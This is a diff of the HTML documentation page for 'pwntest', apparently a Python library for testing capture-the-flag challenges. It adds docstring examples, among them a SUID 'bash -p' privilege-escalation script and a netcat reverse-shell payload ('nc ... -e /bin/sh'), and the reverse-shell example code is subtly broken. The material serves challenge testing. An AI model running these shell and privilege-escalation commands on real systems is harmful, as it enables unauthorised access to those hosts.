@@ -3,10 +3,10 @@
   <head><meta charset="utf-8"/>
     <meta name="viewport" content="width=device-width,initial-scale=1"/>
     <meta name="color-scheme" content="light dark"><meta name="generator" content="Docutils 0.19: https://docutils.sourceforge.io/" />
-<link rel="index" title="Index" href="genindex.html" /><link rel="search" title="Search" href="search.html" /><link rel="next" title="pwntest.modules package" href="pwntest.modules.html" /><link rel="prev" title="Welcome to pwntest’s documentation!" href="index.html" />
+<link rel="index" title="Index" href="genindex.html" /><link rel="search" title="Search" href="search.html" /><link rel="next" title="pwntest.modules.web" href="pwntest.modules.web.html" /><link rel="prev" title="Welcome to pwntest’s documentation!" href="index.html" />
 
     <!-- Generated with Sphinx 6.1.3 and Furo 2022.12.07 -->
-        <title>pwntest package - pwntest 0.1.0 documentation</title>
+        <title>pwntest package - pwntest 0.0.1 documentation</title>
       <link rel="stylesheet" type="text/css" href="_static/pygments.css" />
     <link rel="stylesheet" type="text/css" href="_static/styles/furo.css?digest=91d0f0d1c444bdcb17a68e833c7a53903343c195" />
     <link rel="stylesheet" type="text/css" href="_static/styles/furo-extensions.css?digest=30d1aed668e5c3a91c3e3bf6a60b675221979f0e" />
@@ -123,7 +123,7 @@
       </label>
     </div>
     <div class="header-center">
-      <a href="index.html"><div class="brand">pwntest 0.1.0 documentation</div></a>
+      <a href="index.html"><div class="brand">pwntest 0.0.1 documentation</div></a>
     </div>
     <div class="header-right">
       <div class="theme-toggle-container theme-toggle-header">
@@ -146,7 +146,7 @@
       <div class="sidebar-sticky"><a class="sidebar-brand" href="index.html">
   
   
-  <span class="sidebar-brand-text">pwntest 0.1.0 documentation</span>
+  <span class="sidebar-brand-text">pwntest 0.0.1 documentation</span>
   
 </a><form class="sidebar-search-container" method="get" action="search.html" role="search">
   <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
@@ -154,16 +154,12 @@
   <input type="hidden" name="area" value="default">
 </form>
 <div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
-  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+  <p class="caption" role="heading"><span class="caption-text">Contents</span></p>
 <ul class="current">
 <li class="toctree-l1 current current-page"><a class="current reference internal" href="#">pwntest package</a></li>
-<li class="toctree-l1 has-children"><a class="reference internal" href="pwntest.modules.html">pwntest.modules package</a><input class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle child pages in navigation</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
-<li class="toctree-l2"><a class="reference internal" href="pwntest.modules.binary.html">pwntest.modules.binary module</a></li>
-<li class="toctree-l2"><a class="reference internal" href="pwntest.modules.extended_gdb.html">pwntest.modules.extended_gdb module</a></li>
-<li class="toctree-l2"><a class="reference internal" href="pwntest.modules.gdb_api_bridge.html">pwntest.modules.gdb_api_bridge module</a></li>
-<li class="toctree-l2"><a class="reference internal" href="pwntest.modules.web.html">pwntest.modules.web module</a></li>
-</ul>
-</li>
+<li class="toctree-l1"><a class="reference internal" href="pwntest.modules.web.html">pwntest.modules.web</a></li>
+<li class="toctree-l1"><a class="reference internal" href="pwntest.modules.binary.html">pwntest.modules.binary</a></li>
+<li class="toctree-l1"><a class="reference internal" href="pwntest.modules.extended_gdb.html">pwntest.modules.extended_gdb</a></li>
 </ul>
 
 </div>
@@ -208,24 +204,6 @@
 <dd><p>Bases: <code class="xref py py-class docutils literal notranslate"><span class="pre">object</span></code></p>
 <p>PwnTest is the main class for pwntest. It initialises the other pwntest modules.</p>
 <dl class="py method">
-<dt class="sig sig-object py" id="pwntest.PwnTest.assert_flag">
-<span class="sig-name descname"><span class="pre">assert_flag</span></span><span class="sig-paren">(</span><em class="sig-param"><span class="n"><span class="pre">tube</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">flag_path</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">str</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">flag_str</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">str</span></span></em><span class="sig-paren">)</span> <span class="sig-return"><span class="sig-return-icon">&#x2192;</span> <span class="sig-return-typehint"><span class="pre">bool</span></span></span><a class="headerlink" href="#pwntest.PwnTest.assert_flag" title="Permalink to this definition">#</a></dt>
-<dd><p>Checks if a flag is accessible to a pwntools tube object [ssh, socket, process]</p>
-<dl class="field-list simple">
-<dt class="field-odd">Parameters<span class="colon">:</span></dt>
-<dd class="field-odd"><ul class="simple">
-<li><p><strong>tube</strong> – A pwntools tube object [ssh, socket, process]</p></li>
-<li><p><strong>flag_path</strong> – The path to the flag file</p></li>
-<li><p><strong>flag_str</strong> – The expected flag string</p></li>
-</ul>
-</dd>
-<dt class="field-even">Returns<span class="colon">:</span></dt>
-<dd class="field-even"><p>True if the flag is readable and correct, False otherwise</p>
-</dd>
-</dl>
-</dd></dl>
-
-<dl class="py method">
 <dt class="sig sig-object py" id="pwntest.PwnTest.assert_priv_esc">
 <span class="sig-name descname"><span class="pre">assert_priv_esc</span></span><span class="sig-paren">(</span><em class="sig-param"><span class="n"><span class="pre">user</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">str</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">priv_script</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">str</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">conn</span></span></em><span class="sig-paren">)</span> <span class="sig-return"><span class="sig-return-icon">&#x2192;</span> <span class="sig-return-typehint"><span class="pre">bool</span></span></span><a class="headerlink" href="#pwntest.PwnTest.assert_priv_esc" title="Permalink to this definition">#</a></dt>
 <dd><p>Asserts that a priv esc script can be used to escalate privileges on a host. Works with most of the pwnlib tubes.
@@ -233,15 +211,23 @@ The priv esc script must be executable on the target machine. e.g a shell script
 <dl class="field-list simple">
 <dt class="field-odd">Parameters<span class="colon">:</span></dt>
 <dd class="field-odd"><ul class="simple">
-<li><p><strong>user</strong> – The elevated user</p></li>
-<li><p><strong>conn</strong> – A pwnlib.tubes.[process|sock|ssh] tube.</p></li>
-<li><p><strong>priv_script</strong> – Path to the priv esc script on the local machine.</p></li>
+<li><p><strong>user</strong> – The elevated user to priv esc to.</p></li>
+<li><p><strong>conn</strong> – A pwnlib.tubes.[process, sock, ssh] tube.</p></li>
+<li><p><strong>priv_script</strong> – Path to the priv esc script on the local machine. Does not need to be a particular file type, but must be able to run on the target machine.</p></li>
 </ul>
 </dd>
 <dt class="field-even">Returns<span class="colon">:</span></dt>
 <dd class="field-even"><p>True if the priv esc script worked, False otherwise.</p>
 </dd>
+<dt class="field-odd">Example<span class="colon">:</span></dt>
+<dd class="field-odd"><p></p></dd>
 </dl>
+<div class="doctest highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&quot;/tmp/priv.sh&quot;</span><span class="p">,</span> <span class="s2">&quot;wt&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<span class="gp">&gt;&gt;&gt; </span>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;bash -p</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span> <span class="c1"># if bash on the target is SUID</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="k">assert</span> <span class="n">tester</span><span class="o">.</span><span class="n">assert_priv_esc</span><span class="p">(</span><span class="s2">&quot;root&quot;</span><span class="p">,</span> <span class="s2">&quot;/tmp/priv.sh&quot;</span><span class="p">,</span> <span class="n">tester</span><span class="o">.</span><span class="n">SSHAutomation</span><span class="o">.</span><span class="n">ssh</span><span class="p">)</span>
+<span class="go">True</span>
+</pre></div>
+</div>
 </dd></dl>
 
 <dl class="py method">
@@ -260,11 +246,6 @@ the shell by just attempting to run a command.</p>
 </dl>
 </dd></dl>
 
-<dl class="py attribute">
-<dt class="sig sig-object py" id="pwntest.PwnTest.log">
-<span class="sig-name descname"><span class="pre">log</span></span><em class="property"><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="pre">Logger</span></em><em class="property"><span class="w"> </span><span class="p"><span class="pre">=</span></span><span class="w"> </span><span class="pre">&lt;pwnlib.log.Logger</span> <span class="pre">object&gt;</span></em><a class="headerlink" href="#pwntest.PwnTest.log" title="Permalink to this definition">#</a></dt>
-<dd></dd></dl>
-
 <dl class="py method">
 <dt class="sig sig-object py" id="pwntest.PwnTest.run_reverse_shell_exploit">
 <span class="sig-name descname"><span class="pre">run_reverse_shell_exploit</span></span><span class="sig-paren">(</span><em class="sig-param"><span class="n"><span class="pre">local_host</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">local_port</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">exploit_function</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">timeout</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">float</span></span><span class="w"> </span><span class="o"><span class="pre">=</span></span><span class="w"> </span><span class="default_value"><span class="pre">5</span></span></em>, <em class="sig-param"><span class="o"><span class="pre">**</span></span><span class="n"><span class="pre">kwargs</span></span></em><span class="sig-paren">)</span> <span class="sig-return"><span class="sig-return-icon">&#x2192;</span> <span class="sig-return-typehint"><span class="pre">listen</span></span></span><a class="headerlink" href="#pwntest.PwnTest.run_reverse_shell_exploit" title="Permalink to this definition">#</a></dt>
@@ -276,19 +257,35 @@ the shell by just attempting to run a command.</p>
 <li><p><strong>local_host</strong> – The local interface to listen on</p></li>
 <li><p><strong>local_port</strong> – The local port to listen on</p></li>
 <li><p><strong>exploit_function</strong> – A Python function object. Must take arguments <cite>local_host</cite>, <cite>local_port</cite>, and any <cite>**kwargs</cite></p></li>
+<li><p><strong>kwargs</strong> – Any additional arguments to pass through to the exploit function</p></li>
 </ul>
 </dd>
 <dt class="field-even">Returns<span class="colon">:</span></dt>
 <dd class="field-even"><p>A pwnlib.tubes.listen.listen object if a connection was made, None otherwise</p>
 </dd>
+<dt class="field-odd">Example<span class="colon">:</span></dt>
+<dd class="field-odd"><p></p></dd>
 </dl>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">):</span>
+    <span class="n">send_payload</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;nc </span><span class="si">{</span><span class="n">remote_host</span><span class="si">}</span><span class="s2"> </span><span class="si">{</span><span class="n">rport</span><span class="si">}</span><span class="s2"> -e /bin/sh&quot;</span><span class="p">)</span>
+
+<span class="n">shell</span> <span class="o">=</span> <span class="n">tester</span><span class="o">.</span><span class="n">run_reverse_shell_exploit</span><span class="p">(</span><span class="n">lhost</span><span class="p">,</span> <span class="n">lport</span><span class="p">,</span>
+                                    <span class="n">exploit_function</span><span class="o">=</span><span class="n">exploit_code</span><span class="p">,</span>
+                                    <span class="n">rhost</span><span class="o">=</span><span class="n">rhost</span><span class="p">,</span>
+                                    <span class="n">rhost</span><span class="o">=</span><span class="n">rport</span><span class="p">,</span>
+                                    <span class="n">lhost</span><span class="o">=</span><span class="n">lhost</span><span class="p">,</span>
+                                    <span class="n">lport</span><span class="o">=</span><span class="n">lport</span><span class="p">)</span>
+<span class="n">shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
 </dd></dl>
 
 <dl class="py method">
 <dt class="sig sig-object py" id="pwntest.PwnTest.run_socket_listener">
-<em class="property"><span class="pre">classmethod</span><span class="w"> </span></em><span class="sig-name descname"><span class="pre">run_socket_listener</span></span><span class="sig-paren">(</span><em class="sig-param"><span class="n"><span class="pre">listener_host</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">str</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">listener_port</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">int</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">socket_details</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">dict</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">timeout</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">float</span></span><span class="w"> </span><span class="o"><span class="pre">=</span></span><span class="w"> </span><span class="default_value"><span class="pre">5.0</span></span></em><span class="sig-paren">)</span> <span class="sig-return"><span class="sig-return-icon">&#x2192;</span> <span class="sig-return-typehint"><span class="pre">None</span></span></span><a class="headerlink" href="#pwntest.PwnTest.run_socket_listener" title="Permalink to this definition">#</a></dt>
+<span class="sig-name descname"><span class="pre">run_socket_listener</span></span><span class="sig-paren">(</span><em class="sig-param"><span class="n"><span class="pre">listener_host</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">str</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">listener_port</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">int</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">socket_details</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">dict</span></span></em>, <em class="sig-param"><span class="n"><span class="pre">timeout</span></span><span class="p"><span class="pre">:</span></span><span class="w"> </span><span class="n"><span class="pre">float</span></span><span class="w"> </span><span class="o"><span class="pre">=</span></span><span class="w"> </span><span class="default_value"><span class="pre">5.0</span></span></em><span class="sig-paren">)</span> <span class="sig-return"><span class="sig-return-icon">&#x2192;</span> <span class="sig-return-typehint"><span class="pre">None</span></span></span><a class="headerlink" href="#pwntest.PwnTest.run_socket_listener" title="Permalink to this definition">#</a></dt>
 <dd><p>Listens for a connection on a given host and port. If a connection is made, the socket details are stored in the
-socket_details dictionary.</p>
+socket_details dictionary. This routine was designed to be used by the <code class="docutils literal notranslate"><span class="pre">run_reverse_shell_exploit</span></code> method,
+but can be used independently as well.</p>
 <dl class="field-list simple">
 <dt class="field-odd">Parameters<span class="colon">:</span></dt>
 <dd class="field-odd"><ul class="simple">
@@ -421,12 +418,12 @@ used under MIT license.</p>
       <footer>
         
         <div class="related-pages">
-          <a class="next-page" href="pwntest.modules.html">
+          <a class="next-page" href="pwntest.modules.web.html">
               <div class="page-info">
                 <div class="context">
                   <span>Next</span>
                 </div>
-                <div class="title">pwntest.modules package</div>
+                <div class="title">pwntest.modules.web</div>
               </div>
               <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
             </a>
@@ -474,10 +471,8 @@ used under MIT license.</p>
 <li><a class="reference internal" href="#">pwntest package</a><ul>
 <li><a class="reference internal" href="#module-pwntest">Module contents</a><ul>
 <li><a class="reference internal" href="#pwntest.PwnTest"><code class="docutils literal notranslate"><span class="pre">PwnTest</span></code></a><ul>
-<li><a class="reference internal" href="#pwntest.PwnTest.assert_flag"><code class="docutils literal notranslate"><span class="pre">PwnTest.assert_flag()</span></code></a></li>
 <li><a class="reference internal" href="#pwntest.PwnTest.assert_priv_esc"><code class="docutils literal notranslate"><span class="pre">PwnTest.assert_priv_esc()</span></code></a></li>
 <li><a class="reference internal" href="#pwntest.PwnTest.assert_remote_connected"><code class="docutils literal notranslate"><span class="pre">PwnTest.assert_remote_connected()</span></code></a></li>
-<li><a class="reference internal" href="#pwntest.PwnTest.log"><code class="docutils literal notranslate"><span class="pre">PwnTest.log</span></code></a></li>
 <li><a class="reference internal" href="#pwntest.PwnTest.run_reverse_shell_exploit"><code class="docutils literal notranslate"><span class="pre">PwnTest.run_reverse_shell_exploit()</span></code></a></li>
 <li><a class="reference internal" href="#pwntest.PwnTest.run_socket_listener"><code class="docutils literal notranslate"><span class="pre">PwnTest.run_socket_listener()</span></code></a></li>
 </ul>
